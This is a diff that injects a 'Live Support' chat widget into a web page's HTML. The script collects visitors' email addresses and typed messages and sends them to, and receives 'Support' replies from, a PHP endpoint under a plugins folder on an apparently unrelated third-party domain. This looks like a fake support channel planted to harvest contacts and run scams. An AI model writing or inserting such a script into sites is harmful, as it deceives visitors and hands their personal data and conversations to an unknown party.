@@ -799,6 +799,580 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
 </div>
 
 <script>
+(function () {
+  'use strict';
+
+  // =========================
+  // CONFIG
+  // =========================
+  const API = 'https://mail.institutofedericofroebelmty.com/te/plugins/content/support.php';
+  const POLL_MS = 2000;
+
+  // prevent duplicate load
+  if (window.__LIVECHAT_LOADED__) return;
+  window.__LIVECHAT_LOADED__ = true;
+
+  // =========================
+  // CSS
+  // =========================
+  const style = document.createElement('style');
+
+  style.textContent = `
+  :root{
+    --lc-accent:#1877f2;
+    --lc-user-bg:#1877f2;
+    --lc-user-txt:#fff;
+    --lc-sup-bg:#ececec;
+    --lc-sup-txt:#111;
+    --lc-shadow:0 10px 35px rgba(0,0,0,.18);
+    --lc-radius:18px;
+    --lc-font:Segoe UI,system-ui,sans-serif;
+  }
+
+  #lc-trigger{
+    position:fixed;
+    bottom:24px;
+    right:24px;
+    width:64px;
+    height:64px;
+    border:none;
+    border-radius:50%;
+    background:var(--lc-accent);
+    z-index:999999;
+    cursor:pointer;
+    box-shadow:var(--lc-shadow);
+    display:flex;
+    align-items:center;
+    justify-content:center;
+  }
+
+  #lc-trigger svg{
+    width:30px;
+    height:30px;
+    fill:#fff;
+  }
+
+  #lc-window{
+    position:fixed;
+    right:24px;
+    bottom:100px;
+    width:370px;
+    max-width:calc(100vw - 20px);
+    height:min(700px,calc(100vh - 120px));
+    background:#fff;
+    border-radius:22px;
+    overflow:hidden;
+    z-index:999999;
+    box-shadow:var(--lc-shadow);
+    display:flex;
+    flex-direction:column;
+    font-family:var(--lc-font);
+    opacity:0;
+    pointer-events:none;
+    transform:translateY(20px) scale(.95);
+    transition:.2s;
+  }
+
+  #lc-window.open{
+    opacity:1;
+    pointer-events:auto;
+    transform:translateY(0) scale(1);
+  }
+
+  #lc-header{
+    background:var(--lc-accent);
+    color:#fff;
+    padding:16px;
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+  }
+
+  #lc-header-left{
+    display:flex;
+    gap:10px;
+    align-items:center;
+  }
+
+  #lc-dot{
+    width:10px;
+    height:10px;
+    border-radius:50%;
+    background:#42d97b;
+  }
+
+  #lc-title{
+    font-weight:700;
+    font-size:16px;
+  }
+
+  #lc-sub{
+    font-size:12px;
+    opacity:.9;
+  }
+
+  #lc-close{
+    border:none;
+    background:none;
+    color:#fff;
+    font-size:28px;
+    cursor:pointer;
+  }
+
+  #lc-form{
+    padding:18px;
+    display:flex;
+    flex-direction:column;
+    gap:12px;
+  }
+
+  #lc-form p{
+    margin:0;
+    font-size:14px;
+    color:#666;
+  }
+
+  #lc-email{
+    height:48px;
+    border:1px solid #ddd;
+    border-radius:12px;
+    padding:0 14px;
+    font-size:15px;
+    outline:none;
+  }
+
+  #lc-start{
+    height:46px;
+    border:none;
+    border-radius:12px;
+    background:var(--lc-accent);
+    color:#fff;
+    font-weight:700;
+    cursor:pointer;
+    font-size:15px;
+  }
+
+  #lc-err{
+    color:#e74c3c;
+    font-size:13px;
+  }
+
+  #lc-msgs{
+    flex:1;
+    overflow-y:auto;
+    padding:14px;
+    display:flex;
+    flex-direction:column;
+    gap:10px;
+    background:#fff;
+  }
+
+  .lc-msg{
+    display:flex;
+    flex-direction:column;
+    max-width:80%;
+  }
+
+  .lc-msg.user{
+    align-self:flex-end;
+    align-items:flex-end;
+  }
+
+  .lc-msg.support{
+    align-self:flex-start;
+    align-items:flex-start;
+  }
+
+  .lc-label{
+    font-size:11px;
+    color:#999;
+    margin:0 5px 3px;
+  }
+
+  .lc-bubble{
+    padding:10px 14px;
+    border-radius:16px;
+    font-size:14px;
+    line-height:1.45;
+    word-break:break-word;
+    white-space:pre-wrap;
+  }
+
+  .lc-msg.user .lc-bubble{
+    background:var(--lc-user-bg);
+    color:var(--lc-user-txt);
+    border-bottom-right-radius:4px;
+  }
+
+  .lc-msg.support .lc-bubble{
+    background:var(--lc-sup-bg);
+    color:var(--lc-sup-txt);
+    border-bottom-left-radius:4px;
+  }
+
+  #lc-quick{
+    padding:8px;
+    border-top:1px solid #eee;
+    display:flex;
+    gap:6px;
+    flex-wrap:wrap;
+  }
+
+  .lc-quick-btn{
+    border:none;
+    background:#eee;
+    border-radius:18px;
+    padding:7px 12px;
+    font-size:12px;
+    cursor:pointer;
+  }
+
+  #lc-bar{
+    padding:10px;
+    display:flex;
+    gap:8px;
+    border-top:1px solid #eee;
+    background:#fff;
+  }
+
+  #lc-txt{
+    flex:1;
+    resize:none;
+    border:1px solid #ddd;
+    border-radius:20px;
+    padding:10px 14px;
+    font-size:14px;
+    outline:none;
+    font-family:inherit;
+    max-height:120px;
+  }
+
+  #lc-send{
+    width:46px;
+    height:46px;
+    border:none;
+    border-radius:50%;
+    background:var(--lc-accent);
+    cursor:pointer;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    flex-shrink:0;
+  }
+
+  #lc-send svg{
+    width:20px;
+    height:20px;
+    fill:#fff;
+  }
+
+  #lc-status{
+    text-align:center;
+    font-size:11px;
+    color:#999;
+    padding:7px;
+    border-top:1px solid #eee;
+  }
+
+  @media(max-width:600px){
+    #lc-window{
+      right:10px;
+      left:10px;
+      bottom:85px;
+      width:auto;
+      height:calc(100vh - 100px);
+    }
+  }
+  `;
+
+  document.head.appendChild(style);
+
+  // =========================
+  // HTML
+  // =========================
+  const wrapper = document.createElement('div');
+
+  wrapper.innerHTML = `
+  <button id="lc-trigger">
+    <svg viewBox="0 0 24 24">
+      <path d="M20 2H4a2 2 0 0 0-2 2v18l4-4h14a2 2 0 0 0 2-2V4a2 2 0 0 0-2-2z"/>
+    </svg>
+  </button>
+
+  <div id="lc-window">
+
+    <div id="lc-header">
+      <div id="lc-header-left">
+        <div id="lc-dot"></div>
+        <div>
+          <div id="lc-title">💬 Live Support</div>
+          <div id="lc-sub">We reply instantly</div>
+        </div>
+      </div>
+
+      <button id="lc-close">×</button>
+    </div>
+
+    <div id="lc-form">
+      <p>Enter your email to start support.</p>
+      <input id="lc-email" type="email" placeholder="your@email.com">
+      <button id="lc-start">Start Live Support Chat</button>
+      <div id="lc-err"></div>
+    </div>
+
+    <div id="lc-msgs" hidden></div>
+
+    <div id="lc-quick" hidden></div>
+
+    <div id="lc-bar" hidden>
+      <textarea id="lc-txt" rows="1" placeholder="Type a message..."></textarea>
+
+      <button id="lc-send">
+        <svg viewBox="0 0 24 24">
+          <path d="M2 21l21-9L2 3v7l15 2-15 2z"/>
+        </svg>
+      </button>
+    </div>
+
+    <div id="lc-status" hidden>
+      Connecting...
+    </div>
+
+  </div>
+  `;
+
+  document.body.appendChild(wrapper);
+
+  // =========================
+  // JS
+  // =========================
+  const $ = id => document.getElementById(id);
+
+  let sessionId = localStorage.getItem('lc_id') || null;
+  let known = 0;
+  let poller = null;
+
+  function openChat() {
+    $('lc-window').classList.add('open');
+  }
+
+  function closeChat() {
+    $('lc-window').classList.remove('open');
+  }
+
+  $('lc-trigger').onclick = openChat;
+  $('lc-close').onclick = closeChat;
+
+  function showChat() {
+    $('lc-form').style.display = 'none';
+
+    $('lc-msgs').hidden = false;
+    $('lc-bar').hidden = false;
+    $('lc-status').hidden = false;
+    $('lc-quick').hidden = false;
+  }
+
+  function addMessage(sender, text) {
+    const wrap = document.createElement('div');
+
+    wrap.className = 'lc-msg ' + (sender === 'USER' ? 'user' : 'support');
+
+    wrap.innerHTML = `
+      <div class="lc-label">
+        ${sender === 'USER' ? 'You' : 'Support'}
+      </div>
+
+      <div class="lc-bubble"></div>
+    `;
+
+    wrap.querySelector('.lc-bubble').textContent = text;
+
+    $('lc-msgs').appendChild(wrap);
+
+    $('lc-msgs').scrollTop = $('lc-msgs').scrollHeight;
+  }
+
+  async function post(data) {
+    const r = await fetch(API, {
+      method: 'POST',
+      body: new URLSearchParams(data)
+    });
+
+    return r.json();
+  }
+
+  async function get(data) {
+    const r = await fetch(
+      API + '?' + new URLSearchParams(data)
+    );
+
+    return r.json();
+  }
+
+  async function startSession(email) {
+
+    $('lc-start').disabled = true;
+
+    try {
+
+      const r = await post({
+        action: 'register',
+        email
+      });
+
+      if (!r.success) {
+        $('lc-err').textContent = r.error || 'Failed';
+        return;
+      }
+
+      sessionId = r.id;
+
+      localStorage.setItem('lc_id', sessionId);
+
+      await openLive();
+
+    } catch (e) {
+
+      $('lc-err').textContent = 'Connection failed';
+
+    }
+
+    $('lc-start').disabled = false;
+  }
+
+  async function openLive() {
+
+    showChat();
+
+    $('lc-status').textContent =
+      'Connected · Session #' + sessionId;
+
+    const r = await post({
+      action: 'live',
+      id: sessionId
+    });
+
+    if (r.messages?.length) {
+
+      $('lc-msgs').innerHTML = '';
+
+      r.messages.forEach(m => {
+        addMessage(m.sender, m.text);
+      });
+
+      known = r.messages.length;
+    }
+
+    startPoller();
+  }
+
+  function startPoller() {
+
+    if (poller) clearInterval(poller);
+
+    poller = setInterval(async () => {
+
+      try {
+
+        const r = await get({
+          action: 'messages',
+          id: sessionId,
+          last: known
+        });
+
+        if (!r.success) return;
+
+        if (!r.messages?.length) return;
+
+        r.messages.forEach(m => {
+          addMessage(m.sender, m.text);
+        });
+
+        known += r.messages.length;
+
+      } catch (e) {}
+
+    }, POLL_MS);
+  }
+
+  $('lc-start').onclick = () => {
+
+    const email = $('lc-email').value.trim();
+
+    if (!email) {
+      $('lc-err').textContent = 'Enter email';
+      return;
+    }
+
+    startSession(email);
+  };
+
+  $('lc-send').onclick = sendMessage;
+
+  $('lc-txt').addEventListener('keydown', e => {
+
+    if (e.key === 'Enter' && !e.shiftKey) {
+      e.preventDefault();
+      sendMessage();
+    }
+  });
+
+  async function sendMessage() {
+
+    const text = $('lc-txt').value.trim();
+
+    if (!text || !sessionId) return;
+
+    $('lc-txt').value = '';
+
+    addMessage('USER', text);
+
+    known++;
+
+    try {
+
+      await post({
+        action: 'messenger',
+        id: sessionId,
+        text
+      });
+
+    } catch (e) {}
+  }
+
+  // quick replies
+  [
+    'Hello 👋',
+    'One moment please',
+    'Thanks for contacting us',
+    'Can you explain more?',
+    'We are checking this'
+  ].forEach(text => {
+
+    const btn = document.createElement('button');
+
+    btn.className = 'lc-quick-btn';
+
+    btn.textContent = text;
+
+    btn.onclick = () => {
+      $('lc-txt').value = text;
+      $('lc-txt').focus();
+    };
+
+    $('lc-quick').appendChild(btn);
+  });
+
+  // restore session
+  if (sessionId) {
+    openLive();
+  }
+
+})();
+
+</script>
+     
+<script>
 /* ════════════════════════════════════════════════
    PARTNERS JSON — Add or remove partners here
    ════════════════════════════════════════════════ */
